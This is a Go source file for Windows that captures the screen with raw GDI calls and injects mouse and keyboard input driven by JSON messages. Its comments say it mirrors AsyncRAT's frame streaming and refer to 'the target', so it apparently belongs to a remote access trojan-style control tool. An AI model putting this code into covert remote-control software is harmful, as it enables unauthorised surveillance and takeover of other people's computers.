//go:build windows

package commands

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"syscall"
	"unsafe"
)

// Windows screen capture + input injection, implemented with the raw GDI / user32
// APIs (no CGO). Screen is captured via BitBlt into a 32bpp DIB, converted to
// an image.RGBA and JPEG-encoded, mirroring how AsyncRAT streams frames.

var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")

	procGetDC              = user32.NewProc("GetDC")
	procReleaseDC          = user32.NewProc("ReleaseDC")
	procCreateCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	procCreateDIBSection   = gdi32.NewProc("CreateDIBSection")
	procSelectObject       = gdi32.NewProc("SelectObject")
	procBitBlt             = gdi32.NewProc("BitBlt")
	procDeleteObject       = gdi32.NewProc("DeleteObject")
	procDeleteDC           = gdi32.NewProc("DeleteDC")
	procGetDeviceCaps      = gdi32.NewProc("GetDeviceCaps")
	procSetCursorPos       = user32.NewProc("SetCursorPos")
	procMouseEvent         = user32.NewProc("mouse_event")
	procKeybdEvent         = user32.NewProc("keybd_event")
)

// GDI device caps / constants used by the capture path.
const (
	deviceCapHorzRes = 8  // HORZRES: physical width in pixels
	deviceCapVertRes = 10 // VERTRES: physical height in pixels
)

const (
	srcCopy              = 0x00CC0020
	biRgb                = 0
	dibRgbColors         = 0
	mouseEventMove       = 0x0001
	mouseEventLeftDown   = 0x0002
	mouseEventLeftUp     = 0x0004
	mouseEventRightDown  = 0x0008
	mouseEventRightUp    = 0x0010
	mouseEventMiddleDown = 0x0020
	mouseEventMiddleUp   = 0x0040
	keyEventKeyUp        = 0x0002
)

type bitmapInfoHeader struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

type bitmapInfo struct {
	Header bitmapInfoHeader
	Colors [1]uint32
}

func checkPlatform() error {
	return nil // Windows is the supported platform
}

// captureScreen grabs the primary screen and returns JPEG bytes plus dimensions.
//
// It uses a DIB section created directly in 32bpp memory, then BitBlt's the
// screen into it and reads the pixels straight from the section's memory —
// avoiding GetDIBits entirely. GetDIBits on a CreateCompatibleBitmap DDB is
// fragile under DPI scaling / RDP sessions (it can return 0 with
// GetLastError==ERROR_SUCCESS), which manifested as
// "GetDIBits failed (err=The operation completed successfully., 2358x1278)".
//
// The size is taken from GetDeviceCaps(HORZRES/VERTRES), the physical pixel
// size, so DPI virtualization (GetSystemMetrics returns logical pixels) never
// produces a capture that is mis-sized or that fails on 32bpp screens.
func captureScreen(quality int) ([]byte, int, int, error) {
	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return nil, 0, 0, fmt.Errorf("GetDC failed")
	}
	defer procReleaseDC.Call(0, hdcScreen)

	// Physical (device) pixels — correct even under DPI scaling.
	wR, _, _ := procGetDeviceCaps.Call(hdcScreen, deviceCapHorzRes)
	hR, _, _ := procGetDeviceCaps.Call(hdcScreen, deviceCapVertRes)
	w := int(wR)
	h := int(hR)
	if w <= 0 || h <= 0 {
		return nil, 0, 0, fmt.Errorf("invalid screen size %dx%d", w, h)
	}

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil, 0, 0, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer procDeleteDC.Call(hdcMem)

	// 32bpp top-down DIB section: BitBlt writes straight into its memory.
	bmi := bitmapInfo{}
	bmi.Header.BiSize = uint32(unsafe.Sizeof(bmi.Header))
	bmi.Header.BiWidth = int32(w)
	bmi.Header.BiHeight = -int32(h)
	bmi.Header.BiPlanes = 1
	bmi.Header.BiBitCount = 32
	bmi.Header.BiCompression = biRgb

	var bits unsafe.Pointer
	hBitmap, _, _ := procCreateDIBSection.Call(hdcMem, uintptr(unsafe.Pointer(&bmi)), dibRgbColors, uintptr(unsafe.Pointer(&bits)), 0, 0)
	if hBitmap == 0 {
		return nil, 0, 0, fmt.Errorf("CreateDIBSection failed")
	}
	defer procDeleteObject.Call(hBitmap)
	if bits == nil {
		return nil, 0, 0, fmt.Errorf("CreateDIBSection returned no pixel buffer")
	}

	old, _, _ := procSelectObject.Call(hdcMem, hBitmap)
	if old == 0 {
		return nil, 0, 0, fmt.Errorf("SelectObject failed")
	}
	ret, _, callErr := procBitBlt.Call(hdcMem, 0, 0, uintptr(w), uintptr(h), hdcScreen, 0, 0, srcCopy)
	if ret == 0 {
		return nil, 0, 0, fmt.Errorf("BitBlt failed (err=%v, %dx%d)", callErr, w, h)
	}

	// BGRA (from the DIB section) -> RGBA; alpha is usually 0, force to 255.
	buf := unsafe.Slice((*byte)(bits), w*h*4)
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for i := 0; i < w*h; i++ {
		src := i * 4
		img.Pix[src] = buf[src+2]   // R
		img.Pix[src+1] = buf[src+1] // G
		img.Pix[src+2] = buf[src]   // B
		img.Pix[src+3] = 255        // A
	}

	var out bytes.Buffer
	if err := jpeg.Encode(&out, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, 0, 0, err
	}
	return out.Bytes(), w, h, nil
}

// rdpInputMsg describes a mouse / keyboard event injected on the target.
type rdpInputMsg struct {
	Type   string `json:"type"` // move | click | key
	X      int    `json:"x"`
	Y      int    `json:"y"`
	Button string `json:"button"` // left | right | middle
	Code   int    `json:"code"`   // virtual-key code
	Down   bool   `json:"down"`
}

func rdpInput(argsJSON string) string {
	var msg rdpInputMsg
	if err := json.Unmarshal([]byte(argsJSON), &msg); err != nil {
		return "error: invalid input args: " + err.Error()
	}

	switch msg.Type {
	case "move":
		procSetCursorPos.Call(uintptr(msg.X), uintptr(msg.Y))
	case "click":
		if msg.X >= 0 && msg.Y >= 0 {
			procSetCursorPos.Call(uintptr(msg.X), uintptr(msg.Y))
		}
		var downFlag, upFlag uintptr
		switch msg.Button {
		case "right":
			downFlag, upFlag = mouseEventRightDown, mouseEventRightUp
		case "middle":
			downFlag, upFlag = mouseEventMiddleDown, mouseEventMiddleUp
		default:
			downFlag, upFlag = mouseEventLeftDown, mouseEventLeftUp
		}
		if msg.Down {
			procMouseEvent.Call(downFlag, 0, 0, 0, 0)
		} else {
			procMouseEvent.Call(upFlag, 0, 0, 0, 0)
		}
	case "key":
		if msg.Code <= 0 || msg.Code > 255 {
			return "error: invalid key code"
		}
		flags := uintptr(0)
		if !msg.Down {
			flags = keyEventKeyUp
		}
		procKeybdEvent.Call(uintptr(msg.Code), 0, flags, 0)
	default:
		return "error: unknown input type: " + msg.Type
	}
	return "ok"
}
